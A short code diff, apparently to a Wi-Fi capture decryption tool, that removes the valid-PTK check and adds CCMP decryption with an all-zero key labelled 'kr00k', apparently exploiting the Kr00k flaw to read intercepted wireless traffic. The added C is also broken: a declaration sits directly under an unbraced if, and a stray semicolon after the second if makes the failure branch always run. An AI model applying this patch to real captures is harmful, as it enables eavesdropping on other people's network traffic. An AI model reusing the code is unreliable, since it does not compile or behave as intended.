@@ -934,7 +934,7 @@ int main(int argc, char * argv[])
 
 				/* if the PTK is valid, try to decrypt */
 
-				if (!st_cur->valid_ptk) continue;
+				// if (!st_cur->valid_ptk) continue;
 
 				if (st_cur->keyver == 1)
 				{
@@ -950,6 +950,8 @@ int main(int argc, char * argv[])
 				else if (st_cur->keyver == 2)
 				{
 					if (decrypt_ccmp(h80211, pkh.caplen, st_cur->ptk + 32) == 0)
+					 					unsigned char kr00k[] = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+					if (decrypt_ccmp(h80211, pkh.caplen, kr00k) == 0);	
 					{
 						stats.nb_failed_ccmp++;
 						continue;
